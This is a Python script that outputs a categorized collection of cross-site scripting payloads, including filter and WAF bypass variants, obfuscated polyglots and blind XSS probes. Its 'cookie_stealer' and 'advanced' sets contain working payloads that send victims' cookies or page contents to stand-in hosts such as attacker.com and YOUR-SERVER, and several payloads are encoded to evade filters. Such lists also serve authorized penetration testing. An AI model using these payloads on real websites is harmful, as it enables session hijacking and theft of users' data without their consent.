import sys
import json

def generate_xss_payloads(xss_type='all'):
    """
    Generate XSS (Cross-Site Scripting) payloads
    """
    
    payloads = {
        'basic': {
            'description': 'Basic XSS Payloads',
            'payloads': [
                "<script>alert('XSS')</script>",
                "<script>alert(document.cookie)</script>",
                "<script>alert(document.domain)</script>",
                "<img src=x onerror=alert('XSS')>",
                "<img src=x onerror=alert(document.cookie)>",
                "<svg onload=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<iframe src='javascript:alert(\"XSS\")'>",
                "<input type='text' value='' onclick='alert(\"XSS\")'>",
                "<a href='javascript:alert(\"XSS\")'>Click</a>",
            ]
        },
        'filter_bypass': {
            'description': 'Filter/WAF Bypass XSS',
            'payloads': [
                "<ScRiPt>alert('XSS')</sCrIpT>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<img src=x oNeRrOr=alert('XSS')>",
                "<img src=x onerror='ale'+'rt(\"XSS\")'>",
                "<<SCRIPT>alert('XSS');//<</SCRIPT>",
                "<script>eval('al'+'ert(\"XSS\")')</script>",
                "<script>eval(atob('YWxlcnQoIlhTUyIp'))</script>",  # Base64: alert("XSS")
                "<img/src=x/onerror=alert('XSS')>",
                "<img src=x onerror=`alert('XSS')`>",
                "<svg><script>alert&#40;'XSS'&#41;</script>",
                "<iframe src='java&#115;cript:alert(\"XSS\")'>",
                "';alert(String.fromCharCode(88,83,83))//",
                "<img src='x' onerror='eval(atob(\"YWxlcnQoIlhTUyIp\"))'>",
            ]
        },
        'attribute_based': {
            'description': 'Attribute-based XSS',
            'payloads': [
                "' onmouseover='alert(\"XSS\")'",
                "\" onmouseover='alert(\"XSS\")'",
                "' autofocus onfocus='alert(\"XSS\")'",
                "' onload='alert(\"XSS\")'",
                "' onerror='alert(\"XSS\")'",
                "' onclick='alert(\"XSS\")'",
                "' onanimationend='alert(\"XSS\")'",
                "' style='animation-name:x' onanimationend='alert(\"XSS\")'",
            ]
        },
        'dom_based': {
            'description': 'DOM-based XSS',
            'payloads': [
                "#<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
                "javascript:eval('al'+'ert(\"XSS\")')",
                "#';alert('XSS');//",
            ]
        },
        'polyglot': {
            'description': 'Polyglot XSS (Works in multiple contexts)',
            'payloads': [
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
                "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
                "'\"--></style></script><script>alert(1)</script>",
            ]
        },
        'stored_xss': {
            'description': 'Stored/Persistent XSS',
            'payloads': [
                "<script>alert('Stored XSS')</script>",
                "<img src=x onerror=alert('Stored XSS')>",
                "<svg onload=alert('Stored XSS')>",
                "<<SCRIPT>alert('Stored XSS');//<</SCRIPT>",
            ]
        },
        'blind_xss': {
            'description': 'Blind XSS (For testing admin panels)',
            'payloads': [
                "<script src='http://YOUR-SERVER/xss.js'></script>",
                "<img src='http://YOUR-SERVER/xss.gif' onerror='alert(1)'>",
                "<script>fetch('http://YOUR-SERVER?cookie='+document.cookie)</script>",
                "<script>new Image().src='http://YOUR-SERVER?cookie='+document.cookie</script>",
                "<script>document.location='http://YOUR-SERVER?cookie='+document.cookie</script>",
            ]
        },
        'cookie_stealer': {
            'description': 'Cookie Stealing XSS',
            'payloads': [
                "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
                "<script>new Image().src='http://attacker.com/?c='+document.cookie</script>",
                "<script>fetch('http://attacker.com/?c='+btoa(document.cookie))</script>",
                "<img src=x onerror='this.src=\"http://attacker.com/?c=\"+document.cookie'>",
            ]
        },
        'advanced': {
            'description': 'Advanced XSS Techniques',
            'payloads': [
                "<script>var xhr=new XMLHttpRequest();xhr.open('GET','http://attacker.com?d='+btoa(document.body.innerHTML));xhr.send();</script>",
                "<script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,62,97,108,101,114,116,40,34,88,83,83,34,41,60,47,115,99,114,105,112,116,62,39,41))</script>",
                "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>",
                "<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>",
            ]
        }
    }
    
    if xss_type == 'all':
        result = {
            'total_categories': len(payloads),
            'total_payloads': sum(len(cat['payloads']) for cat in payloads.values()),
            'categories': payloads
        }
    elif xss_type in payloads:
        result = {
            'category': xss_type,
            'description': payloads[xss_type]['description'],
            'payloads': payloads[xss_type]['payloads'],
            'count': len(payloads[xss_type]['payloads'])
        }
    else:
        error = {"error": f"Invalid XSS type: {xss_type}"}
        print(json.dumps(error))
        return 1
    
    print(json.dumps(result, indent=2))
    return 0

if __name__ == "__main__":
    xss_type = sys.argv[1] if len(sys.argv) > 1 else 'all'
    sys.exit(generate_xss_payloads(xss_type))